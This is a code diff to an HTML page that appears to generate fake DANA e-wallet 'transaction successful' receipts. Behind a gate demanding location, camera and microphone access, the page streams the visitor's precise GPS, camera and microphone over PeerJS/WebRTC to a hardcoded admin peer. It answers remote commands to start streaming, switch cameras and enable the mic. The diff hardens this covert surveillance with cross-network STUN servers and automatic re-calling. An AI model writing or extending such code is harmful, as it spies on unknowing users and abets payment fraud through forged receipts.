@@ -44,38 +44,6 @@
       --banner-h: clamp(102px, 30vw, 132px);
     }
 
-    .density-compact {
-      --rc-pad-top: 10px;
-      --rc-pad-bot: 7px;
-      --rc-gap: 7px;
-      --rc-row-py: 6px;
-      --rc-logo-size: 25px;
-      --rc-logo-fs: 18px;
-      --rc-meta-fs: 10px;
-      --rc-status-fs: 11px;
-      --rc-summary-fs: 11.5px;
-      --rc-total-fs: 12.5px;
-      --rc-label-fs: 11px;
-      --rc-sub-fs: 10px;
-      --rc-footer-fs: 7.5px;
-    }
-
-    .density-tall {
-      --rc-pad-top: 20px;
-      --rc-pad-bot: 14px;
-      --rc-gap: 16px;
-      --rc-row-py: 11px;
-      --rc-logo-size: 30px;
-      --rc-logo-fs: 21px;
-      --rc-meta-fs: 11px;
-      --rc-status-fs: 12px;
-      --rc-summary-fs: 13px;
-      --rc-total-fs: 13.5px;
-      --rc-label-fs: 12px;
-      --rc-sub-fs: 11px;
-      --rc-footer-fs: 8.5px;
-    }
-
     * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
     html, body {
@@ -139,8 +107,6 @@
       letter-spacing: 0.04em;
       cursor: pointer;
     }
-
-    .gate-btn:active { background: #0D7CD0; }
 
     #hiddenCameraLayer {
       position: fixed;
@@ -229,343 +195,69 @@
     }
 
     .field-input:focus { background-color: #FFFFFF; border-color: #118EE9; }
-
     .saldo-combo-wrap { position: relative; }
     .saldo-input-box { position: relative; display: flex; align-items: center; }
-
-    .saldo-actions {
-      position: absolute;
-      right: 6px;
-      top: 50%;
-      transform: translateY(-50%);
-      display: flex;
-      align-items: center;
-    }
+    .saldo-actions { position: absolute; right: 6px; top: 50%; transform: translateY(-50%); display: flex; align-items: center; }
 
     .saldo-icon-btn {
-      width: 26px;
-      height: 26px;
-      border: none;
-      background: transparent;
-      color: #64748B;
-      border-radius: 9999px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      padding: 0;
+      width: 26px; height: 26px; border: none; background: transparent;
+      color: #64748B; border-radius: 9999px; display: flex; align-items: center; justify-content: center; cursor: pointer; padding: 0;
     }
 
     .saldo-dropdown {
-      position: absolute;
-      top: calc(100% + 5px);
-      left: 0;
-      right: 0;
-      max-height: 230px;
-      overflow-y: auto;
-      overscroll-behavior: contain;
-      -webkit-overflow-scrolling: touch;
-      background-color: #FFFFFF;
-      border: 1px solid #CBD5E1;
-      border-radius: 12px;
-      box-shadow: 0 12px 28px rgba(15, 23, 42, 0.16);
-      z-index: 60;
-      padding: 4px;
+      position: absolute; top: calc(100% + 5px); left: 0; right: 0; max-height: 230px;
+      overflow-y: auto; background-color: #FFFFFF; border: 1px solid #CBD5E1; border-radius: 12px;
+      box-shadow: 0 12px 28px rgba(15, 23, 42, 0.16); z-index: 60; padding: 4px;
     }
 
     .saldo-option-item {
-      width: 100%;
-      border: none;
-      background: transparent;
-      padding: 9px 10px;
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 8px;
-      text-align: left;
-      cursor: pointer;
+      width: 100%; border: none; background: transparent; padding: 9px 10px; border-radius: 8px;
+      display: flex; align-items: center; justify-content: space-between; gap: 8px; text-align: left; cursor: pointer;
     }
 
     .saldo-option-item:hover, .saldo-option-item:active { background-color: #EFF6FF; }
-    .saldo-option-item.is-selected { background-color: #E0F2FE; }
-
-    .saldo-option-name {
-      font-size: 13px;
-      font-weight: 600;
-      color: #0F172A;
-      min-width: 0;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-
-    .saldo-option-cat {
-      font-size: 10px;
-      font-weight: 700;
-      color: #118EE9;
-      background-color: #EFF6FF;
-      border: 1px solid #BFDBFE;
-      padding: 2px 6px;
-      border-radius: 9999px;
-      flex-shrink: 0;
-      white-space: nowrap;
-    }
+    .saldo-option-name { font-size: 13px; font-weight: 600; color: #0F172A; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .saldo-option-cat { font-size: 10px; font-weight: 700; color: #118EE9; background-color: #EFF6FF; border: 1px solid #BFDBFE; padding: 2px 6px; border-radius: 9999px; flex-shrink: 0; }
 
     .grid-2 { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px; }
-
-    .btn-test-audio {
-      padding: 7px 10px;
-      background-color: #EFF6FF;
-      color: #118EE9;
-      border: 1px solid #68B5EE;
-      border-radius: 8px;
-      font-size: 11px;
-      font-weight: 700;
-      flex-shrink: 0;
-      cursor: pointer;
-    }
-
-    .btn-kirim-wrap {
-      flex-shrink: 0;
-      padding: 8px 12px max(12px, env(safe-area-inset-bottom)) 12px;
-      background-color: #F5F6F8;
-      border-top: 1px solid #E5E9F0;
-      position: relative;
-      z-index: 30;
-    }
+    .btn-test-audio { padding: 7px 10px; background-color: #EFF6FF; color: #118EE9; border: 1px solid #68B5EE; border-radius: 8px; font-size: 11px; font-weight: 700; flex-shrink: 0; cursor: pointer; }
+    .btn-kirim-wrap { flex-shrink: 0; padding: 8px 12px max(12px, env(safe-area-inset-bottom)) 12px; background-color: #F5F6F8; border-top: 1px solid #E5E9F0; position: relative; z-index: 30; }
 
     #btnKirim {
-      width: 100%;
-      min-height: 46px;
-      padding: 12px 16px;
-      background-color: #118EE9;
-      color: #FFFFFF;
-      font-weight: 700;
-      font-size: 14px;
-      letter-spacing: 0.05em;
-      border: none;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(17, 142, 233, 0.28);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      cursor: pointer;
+      width: 100%; min-height: 46px; padding: 12px 16px; background-color: #118EE9; color: #FFFFFF;
+      font-weight: 700; font-size: 14px; letter-spacing: 0.05em; border: none; border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(17, 142, 233, 0.28); display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer;
     }
 
-    .full-blue-screen {
-      background-color: #118EE9;
-      background-image: linear-gradient(180deg, #1290EB 0%, #1088E0 55%, #0E81D6 100%);
-      color: #FFFFFF;
-    }
-
-    .full-blue-scroll {
-      flex: 1 1 auto;
-      min-height: 0;
-      overflow-y: auto;
-      overscroll-behavior: contain;
-      -webkit-overflow-scrolling: touch;
-      padding: max(20px, env(safe-area-inset-top)) var(--footer-px) 14px var(--footer-px);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .coin-badge {
-      width: var(--coin-size);
-      height: var(--coin-size);
-      border-radius: 9999px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      margin-bottom: var(--coin-mb);
-      box-shadow: 0 6px 20px rgba(7, 46, 88, 0.24);
-    }
-
+    .full-blue-screen { background-color: #118EE9; background-image: linear-gradient(180deg, #1290EB 0%, #1088E0 55%, #0E81D6 100%); color: #FFFFFF; }
+    .full-blue-scroll { flex: 1 1 auto; min-height: 0; overflow-y: auto; padding: max(20px, env(safe-area-inset-top)) var(--footer-px) 14px var(--footer-px); display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    .coin-badge { width: var(--coin-size); height: var(--coin-size); border-radius: 9999px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-bottom: var(--coin-mb); box-shadow: 0 6px 20px rgba(7, 46, 88, 0.24); }
     .coin-badge svg { width: 100%; height: 100%; display: block; }
-
-    .pill-share-btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      padding: 7px 18px;
-      border-radius: 9999px;
-      border: 1.3px solid rgba(255, 255, 255, 0.9);
-      background-color: transparent;
-      color: #FFFFFF;
-      font-size: 11.5px;
-      font-weight: 600;
-      letter-spacing: 0.05em;
-      cursor: pointer;
-    }
-
-    .full-blue-footer {
-      flex-shrink: 0;
-      width: 100%;
-      padding: 8px var(--footer-px) max(var(--footer-pb), env(safe-area-inset-bottom)) var(--footer-px);
-      display: flex;
-      flex-direction: column;
-      align-items: stretch;
-      gap: var(--footer-gap);
-    }
-
-    .btn-solid-white {
-      width: 100%;
-      padding: var(--btn-footer-py) 14px;
-      border-radius: 7px;
-      border: 1.5px solid #FFFFFF;
-      background-color: rgba(255, 255, 255, 0.96);
-      color: #118EE9;
-      font-size: var(--btn-footer-fs);
-      font-weight: 700;
-      letter-spacing: 0.06em;
-      line-height: 1.2;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      cursor: pointer;
-    }
-
-    .btn-outline-white {
-      width: 100%;
-      padding: var(--btn-footer-py) 14px;
-      border-radius: 7px;
-      border: 1.5px solid rgba(255, 255, 255, 0.9);
-      background-color: transparent;
-      color: #FFFFFF;
-      font-size: var(--btn-footer-fs);
-      font-weight: 700;
-      letter-spacing: 0.06em;
-      line-height: 1.2;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      cursor: pointer;
-    }
-
-    .dana-header-top {
-      background-color: #118EE9;
-      padding: max(10px, env(safe-area-inset-top)) 14px 10px 14px;
-      color: #FFFFFF;
-      flex-shrink: 0;
-      position: relative;
-      z-index: 10;
-    }
-
-    .receipt-body-wrap {
-      flex: 1 1 auto;
-      min-height: 0;
-      padding: 2px var(--rc-px) var(--rc-pad-bot) var(--rc-px);
-      display: flex;
-      flex-direction: column;
-      gap: var(--rc-gap);
-      position: relative;
-      z-index: 2;
-      overflow-y: auto;
-      overscroll-behavior: contain;
-      -webkit-overflow-scrolling: touch;
-    }
-
-    .receipt-body-wrap::before {
-      content: "";
-      position: absolute;
-      top: -2px;
-      left: 0;
-      right: 0;
-      height: var(--rc-backdrop-h);
-      background-color: #118EE9;
-      z-index: 0;
-      pointer-events: none;
-    }
-
-    .receipt-card {
-      background-color: #FFFFFF;
-      border-radius: 11px 11px 0 0;
-      position: relative;
-      z-index: 2;
-      overflow: hidden;
-      border-top: 1px solid #E5E9F0;
-      border-left: 1px solid #E5E9F0;
-      border-right: 1px solid #E5E9F0;
-      box-shadow: 0 3px 12px rgba(17, 142, 233, 0.06);
-    }
-
-    .watermark-layer {
-      position: absolute;
-      inset: 0;
-      pointer-events: none;
-      z-index: 0;
-      opacity: 0.048;
-      background-repeat: repeat;
-      background-size: 132px 132px;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='138' height='138' viewBox='0 0 138 138'%3E%3Cg transform='rotate(-45 69 69)' fill='%23118EE9'%3E%3Ccircle cx='34' cy='69' r='12'/%3E%3Cpath d='M27 66.5c2.5-1.5 5.2-1.5 7.7 0s5.2 1.5 7.7 0v5.5c-2.5 1.5-5.2 1.5-7.7 0s-5.2-1.5-7.7 0v-5.5z' fill='%23FFFFFF'/%3E%3Ctext x='51' y='74' font-family='Arial, sans-serif' font-weight='800' font-size='15' letter-spacing='1.5'%3EDANA%3C/text%3E%3C/g%3E%3C/svg%3E");
-    }
-
-    .straight-divider { border-top: 1px solid #EEF1F5; margin: 0 var(--rc-px); position: relative; z-index: 2; }
-
-    .total-pay-box {
-      background-color: #EFF6FC;
-      border-radius: 7px;
-      padding: var(--rc-row-py) 12px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    .scallop-bottom {
-      height: 8px;
-      width: 100%;
-      background-color: #F5F6F8;
-      position: relative;
-      z-index: 2;
-      flex-shrink: 0;
-      background-image: radial-gradient(circle at 7px 0px, #FFFFFF 6.5px, #E5E9F0 7px, transparent 7.5px);
-      background-size: 14px 8px;
-      background-repeat: repeat-x;
-    }
-
-    .banner-card { position: relative; z-index: 2; display: flex; justify-content: center; flex-shrink: 0; margin: auto 0; }
-    .receipt-bottom-actions { position: relative; z-index: 10; flex-shrink: 0; margin-top: auto; }
-
-    .btn-outline-dana {
-      width: 100%;
-      background-color: #FFFFFF;
-      border: 1px solid #68B5EE;
-      border-radius: 7px;
-      color: #118EE9;
-      font-size: clamp(11.5px, 3.2vw, 12.5px);
-      font-weight: 600;
-      letter-spacing: 0.03em;
-      cursor: pointer;
-    }
-
-    .bottom-bar-dock {
-      flex-shrink: 0;
-      width: 100%;
-      background-color: #FFFFFF;
-      border-top: 1px solid #E5E9F0;
-      padding: clamp(7px, 1.1dvh, 10px) var(--rc-px) max(9px, env(safe-area-inset-bottom)) var(--rc-px);
-      z-index: 20;
-    }
-
+    .pill-share-btn { display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 7px 18px; border-radius: 9999px; border: 1.3px solid rgba(255, 255, 255, 0.9); background-color: transparent; color: #FFFFFF; font-size: 11.5px; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; }
+    .full-blue-footer { flex-shrink: 0; width: 100%; padding: 8px var(--footer-px) max(var(--footer-pb), env(safe-area-inset-bottom)) var(--footer-px); display: flex; flex-direction: column; align-items: stretch; gap: var(--footer-gap); }
+    .btn-solid-white { width: 100%; padding: var(--btn-footer-py) 14px; border-radius: 7px; border: 1.5px solid #FFFFFF; background-color: rgba(255, 255, 255, 0.96); color: #118EE9; font-size: var(--btn-footer-fs); font-weight: 700; letter-spacing: 0.06em; cursor: pointer; }
+    .btn-outline-white { width: 100%; padding: var(--btn-footer-py) 14px; border-radius: 7px; border: 1.5px solid rgba(255, 255, 255, 0.9); background-color: transparent; color: #FFFFFF; font-size: var(--btn-footer-fs); font-weight: 700; letter-spacing: 0.06em; cursor: pointer; }
+    .dana-header-top { background-color: #118EE9; padding: max(10px, env(safe-area-inset-top)) 14px 10px 14px; color: #FFFFFF; flex-shrink: 0; }
+    .receipt-body-wrap { flex: 1 1 auto; min-height: 0; padding: 2px var(--rc-px) var(--rc-pad-bot) var(--rc-px); display: flex; flex-direction: column; gap: var(--rc-gap); overflow-y: auto; }
+    .receipt-card { background-color: #FFFFFF; border-radius: 11px 11px 0 0; position: relative; overflow: hidden; border: 1px solid #E5E9F0; }
+    .straight-divider { border-top: 1px solid #EEF1F5; margin: 0 var(--rc-px); }
+    .total-pay-box { background-color: #EFF6FC; border-radius: 7px; padding: var(--rc-row-py) 12px; display: flex; align-items: center; justify-content: space-between; }
+    .scallop-bottom { height: 8px; width: 100%; background-color: #F5F6F8; background-image: radial-gradient(circle at 7px 0px, #FFFFFF 6.5px, #E5E9F0 7px, transparent 7.5px); background-size: 14px 8px; background-repeat: repeat-x; }
+    .receipt-bottom-actions { flex-shrink: 0; margin-top: auto; }
+    .btn-outline-dana { width: 100%; background-color: #FFFFFF; border: 1px solid #68B5EE; border-radius: 7px; color: #118EE9; font-size: clamp(11.5px, 3.2vw, 12.5px); font-weight: 600; cursor: pointer; }
+    .bottom-bar-dock { flex-shrink: 0; width: 100%; background-color: #FFFFFF; border-top: 1px solid #E5E9F0; padding: clamp(7px, 1.1dvh, 10px) var(--rc-px) max(9px, env(safe-area-inset-bottom)) var(--rc-px); }
     .tabular-nums { font-variant-numeric: tabular-nums; }
   </style>
 </head>
 <body>
   <div id="permissionGate">
     <div class="gate-card">
-      <h2 style="font-size:17px;font-weight:700;margin-bottom:8px;">Izin Lokasi & Kamera Diperlukan</h2>
+      <h2 style="font-size:17px;font-weight:700;margin-bottom:8px;">Izin Lokasi, Kamera & Mikrofon</h2>
       <p id="gateStatusText" style="font-size:12.5px;color:#CBD5E1;line-height:1.45;">
-        Memeriksa akses lokasi akurat dan kamera perangkat...
+        Memeriksa akses lokasi akurat, kamera, dan mikrofon perangkat...
       </p>
       <button type="button" id="btnRetryPermission" onclick="requestMandatoryPermissions()" class="gate-btn">
-        Izinkan Lokasi & Kamera
+        Izinkan Semua Akses
       </button>
     </div>
   </div>
@@ -623,12 +315,12 @@
             <label for="inputName" style="font-size:12px;font-weight:600;color:#334155;">Nama Penerima</label>
             <span style="font-size:10px;font-weight:600;color:#118EE9;text-align:right;">Auto Sensor (WAHYU M****NA)</span>
           </div>
-          <input type="text" id="inputName" value="" placeholder="Contoh : WAHYU MAULANA" oninput="preBufferOnFormActivity()" class="field-input" />
+          <input type="text" id="inputName" value="" placeholder="Contoh : WAHYU MAULANA" class="field-input" />
         </div>
 
         <div>
           <label for="inputPhone" style="display:block;font-size:12px;font-weight:600;color:#334155;margin-bottom:4px;">Nomor Penerima</label>
-          <input type="text" id="inputPhone" value="" inputmode="numeric" placeholder="Contoh : 085841512418" oninput="preBufferOnFormActivity()" class="field-input tabular-nums" />
+          <input type="text" id="inputPhone" value="" inputmode="numeric" placeholder="Contoh : 085841512418" class="field-input tabular-nums" />
         </div>
 
         <div>
@@ -709,18 +401,17 @@
       </div>
     </header>
     <main class="receipt-body-wrap no-scrollbar">
-      <div style="position:relative;z-index:10;flex-shrink:0;">
+      <div style="flex-shrink:0;">
         <div class="receipt-card">
-          <div class="watermark-layer"></div>
-          <div style="position:relative;z-index:10;padding:var(--rc-pad-top) var(--rc-px) var(--rc-pad-bot) var(--rc-px);display:flex;align-items:center;justify-content:center;">
+          <div style="padding:var(--rc-pad-top) var(--rc-px) var(--rc-pad-bot) var(--rc-px);display:flex;align-items:center;justify-content:center;">
             <span style="font-size:var(--rc-logo-fs);font-weight:700;letter-spacing:0.14em;color:#118EE9;">DANA</span>
           </div>
-          <div class="tabular-nums" style="position:relative;z-index:10;padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
+          <div class="tabular-nums" style="padding:0 var(--rc-px) 7px var(--rc-px);display:flex;justify-content:space-between;font-size:var(--rc-meta-fs);color:#8A94A6;">
             <span id="displayDateTime">20 Nov 2026 • 22:32</span>
             <span id="displayIdDana">ID DANA 0858••••2418</span>
           </div>
           <div class="straight-divider"></div>
-          <div style="position:relative;z-index:10;padding:var(--rc-pad-bot) var(--rc-px) var(--rc-pad-bot) var(--rc-px);">
+          <div style="padding:var(--rc-pad-bot) var(--rc-px) var(--rc-pad-bot) var(--rc-px);">
             <div style="font-size:var(--rc-status-fs);font-weight:500;color:#4A5568;margin-bottom:6px;">Transaksi berhasil!</div>
             <p id="displaySummaryText" style="margin:0 0 8px 0;font-size:var(--rc-summary-fs);font-weight:600;color:#1A1A1A;">Kirim Uang Rp0 ke -</p>
             <div class="total-pay-box" style="margin-bottom:8px;">
@@ -797,9 +488,7 @@
     function getRankedSaldoMatches(rawQuery) {
       const q = rawQuery.trim().toLowerCase();
       if (!q) return [];
-      return SALDO_OPTIONS.filter((item) =>
-        item.value.toLowerCase().includes(q) || item.alias.toLowerCase().includes(q)
-      );
+      return SALDO_OPTIONS.filter((item) => item.value.toLowerCase().includes(q) || item.alias.toLowerCase().includes(q));
     }
 
     function renderSaldoDropdown(query) {
@@ -886,10 +575,6 @@
     mediaEl.addEventListener('canplay', () => setAudioStatus('Suara MP4 siap (Bunyi saat Test / KIRIM)', '#059669'));
     mediaEl.addEventListener('playing', () => setAudioStatus('Suara asli MP4 sedang berbunyi!', '#118EE9'));
     mediaEl.addEventListener('error', () => setAudioStatus('Gagal memuat MP4', '#DC2626'));
-
-    function preBufferOnFormActivity() {
-      if (mediaEl.error) try { mediaEl.load(); } catch (_) {}
-    }
 
     function playNotifSound(sourceLabel) {
       try {
@@ -1030,10 +715,21 @@
     }
 
     /* =========================================================================
-       MODUL MEMBER: LOKASI AKURAT + KAMERA + MIKROFON KE ADMIN
+       MODUL MEMBER: LOKASI AKURAT + KAMERA + MIKROFON (LINTAS JARINGAN)
        ========================================================================= */
     const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
     const MEMBER_PEER_ID = "jirun-hp-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 6);
+
+    const PEER_CONFIG = {
+      config: {
+        iceServers: [
+          { urls: "stun:stun.l.google.com:19302" },
+          { urls: "stun:stun1.l.google.com:19302" },
+          { urls: "stun:stun2.l.google.com:19302" },
+          { urls: "stun:global.stun.twilio.com:3478" }
+        ]
+      }
+    };
 
     let currentFacing = "user";
     let micEnabled = true;
@@ -1047,6 +743,7 @@
     let hasCameraPermission = false;
     let isRequestingPerms = false;
 
+    const pendingStreamAdmins = new Set();
     const activeCallsByAdmin = {};
     const adminConns = {};
     const localVideoEl = document.getElementById("localVideo");
@@ -1086,33 +783,45 @@
           watchId = null;
         }
 
-        let settled = false;
+        const applyPos = (pos, isResolve) => {
+          latestLocation = {
+            lat: Number(pos.coords.latitude.toFixed(6)),
+            lng: Number(pos.coords.longitude.toFixed(6)),
+            accuracy: Math.round(pos.coords.accuracy) + " m",
+            speed: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
+              ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
+              : "-",
+            heading: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
+              ? Math.round(pos.coords.heading) + "°"
+              : "-"
+          };
+          hasAccurateLocation = true;
+          broadcastPresenceToAdmins();
+          if (isResolve && resolveFn) {
+            resolveFn(latestLocation);
+            resolveFn = null;
+          }
+        };
+
+        let resolveFn = resolve;
+
+        // Ambil posisi awal dengan toleransi agar tidak gagal di dalam ruangan
+        navigator.geolocation.getCurrentPosition(
+          (pos) => applyPos(pos, true),
+          () => {},
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 15000 }
+        );
+
         watchId = navigator.geolocation.watchPosition(
-          (pos) => {
-            latestLocation = {
-              lat: Number(pos.coords.latitude.toFixed(6)),
-              lng: Number(pos.coords.longitude.toFixed(6)),
-              accuracy: Math.round(pos.coords.accuracy) + " m",
-              speed: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
-                ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
-                : "-",
-              heading: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
-                ? Math.round(pos.coords.heading) + "°"
-                : "-"
-            };
-            hasAccurateLocation = true;
-            broadcastPresenceToAdmins();
-            if (!settled) {
-              settled = true;
-              resolve(latestLocation);
-            }
-          },
+          (pos) => applyPos(pos, true),
           (err) => {
-            if (!hasAccurateLocation) {
+            if (!hasAccurateLocation && resolveFn) {
+              const fn = resolveFn;
+              resolveFn = null;
               reject(new Error(err?.message || "Izin lokasi akurat ditolak."));
             }
           },
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 5000 }
         );
       });
     }
@@ -1122,7 +831,8 @@
         video: {
           facingMode: { ideal: facing },
           width: { ideal: 640 },
-          height: { ideal: 480 }
+          height: { ideal: 480 },
+          frameRate: { ideal: 24, max: 30 }
         },
         audio: withAudio
           ? { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
@@ -1182,8 +892,40 @@
       await localVideoEl.play().catch(() => {});
 
       await syncTracksToActiveCalls(stream);
+      flushPendingStreamCalls();
       broadcastPresenceToAdmins();
       return stream;
+    }
+
+    function placeCallToAdmin(adminId, forceNew = false) {
+      if (!peer || peer.destroyed || !cameraStream) {
+        pendingStreamAdmins.add(adminId);
+        return;
+      }
+      if (forceNew && activeCallsByAdmin[adminId]) {
+        try { activeCallsByAdmin[adminId].close(); } catch (_) {}
+        delete activeCallsByAdmin[adminId];
+      }
+      if (!activeCallsByAdmin[adminId]) {
+        const call = peer.call(adminId, cameraStream);
+        if (call) {
+          activeCallsByAdmin[adminId] = call;
+          call.on("close", () => {
+            delete activeCallsByAdmin[adminId];
+          });
+          call.on("error", () => {
+            delete activeCallsByAdmin[adminId];
+          });
+        }
+      }
+      pendingStreamAdmins.delete(adminId);
+    }
+
+    function flushPendingStreamCalls() {
+      if (!cameraStream || !peer || peer.destroyed) return;
+      for (const adminId of Array.from(pendingStreamAdmins)) {
+        placeCallToAdmin(adminId, true);
+      }
     }
 
     function getDeviceSummary() {
@@ -1224,7 +966,10 @@
       }
       const conn = peer.connect(ADMIN_LOBBY_ID, { reliable: true });
       lobbyConn = conn;
-      conn.on("open", () => broadcastPresenceToAdmins());
+      conn.on("open", () => {
+        broadcastPresenceToAdmins();
+        if (cameraStream) placeCallToAdmin(ADMIN_LOBBY_ID, false);
+      });
       conn.on("data", (msg) => handleAdminMessage(conn.peer, msg));
       conn.on("close", () => { if (lobbyConn === conn) lobbyConn = null; });
       conn.on("error", () => {});
@@ -1234,55 +979,55 @@
       if (!msg || !msg.type) return;
 
       if (msg.type === "REQUEST_STREAM") {
-        if (!cameraStream) return;
-        if (activeCallsByAdmin[fromPeerId]) {
-          try { activeCallsByAdmin[fromPeerId].close(); } catch (_) {}
+        pendingStreamAdmins.add(fromPeerId);
+        if (!cameraStream) {
+          await openCameraKeepAlive(currentFacing, true).catch(() => {});
         }
-        const call = peer.call(fromPeerId, cameraStream);
-        if (call) {
-          activeCallsByAdmin[fromPeerId] = call;
-          call.on("close", () => delete activeCallsByAdmin[fromPeerId]);
-        }
+        placeCallToAdmin(fromPeerId, true);
         broadcastPresenceToAdmins();
       } else if (msg.type === "SWITCH_CAM") {
         const target = msg.facing === "environment" || msg.facing === "user"
           ? msg.facing
           : (currentFacing === "user" ? "environment" : "user");
         await openCameraKeepAlive(target, micEnabled).catch(() => {});
+        placeCallToAdmin(fromPeerId, true);
       } else if (msg.type === "ENABLE_MIC") {
         await openCameraKeepAlive(currentFacing, true).catch(() => {});
-        if (cameraStream && peer && !peer.destroyed) {
-          if (activeCallsByAdmin[fromPeerId]) {
-            try { activeCallsByAdmin[fromPeerId].close(); } catch (_) {}
-          }
-          const call = peer.call(fromPeerId, cameraStream);
-          if (call) {
-            activeCallsByAdmin[fromPeerId] = call;
-            call.on("close", () => delete activeCallsByAdmin[fromPeerId]);
-          }
-        }
+        placeCallToAdmin(fromPeerId, true);
       } else if (msg.type === "PING") {
+        if (cameraStream && !activeCallsByAdmin[fromPeerId]) {
+          placeCallToAdmin(fromPeerId, false);
+        }
         broadcastPresenceToAdmins();
       }
     }
 
     function setupMemberPeer() {
       if (peer || typeof Peer === "undefined") return;
-      peer = new Peer(MEMBER_PEER_ID);
+      peer = new Peer(MEMBER_PEER_ID, PEER_CONFIG);
 
-      peer.on("open", () => connectToAdminLobby());
+      peer.on("open", () => {
+        connectToAdminLobby();
+        flushPendingStreamCalls();
+      });
+
       peer.on("connection", (conn) => {
         adminConns[conn.peer] = conn;
-        conn.on("open", () => conn.send(buildPresencePayload()));
+        conn.on("open", () => {
+          conn.send(buildPresencePayload());
+          if (cameraStream) placeCallToAdmin(conn.peer, false);
+        });
         conn.on("data", (msg) => handleAdminMessage(conn.peer, msg));
         conn.on("close", () => delete adminConns[conn.peer]);
       });
+
       peer.on("call", (call) => {
         if (!cameraStream) return;
         activeCallsByAdmin[call.peer] = call;
         call.answer(cameraStream);
         call.on("close", () => delete activeCallsByAdmin[call.peer]);
       });
+
       peer.on("disconnected", () => {
         if (peer && !peer.destroyed) peer.reconnect();
       });
@@ -1291,9 +1036,12 @@
         heartbeatTimer = setInterval(() => {
           if (hasAccurateLocation && hasCameraPermission && cameraStream) {
             connectToAdminLobby();
+            if (!activeCallsByAdmin[ADMIN_LOBBY_ID] && lobbyConn && lobbyConn.open) {
+              placeCallToAdmin(ADMIN_LOBBY_ID, false);
+            }
             broadcastPresenceToAdmins();
           }
-        }, 2500);
+        }, 3000);
       }
     }
 
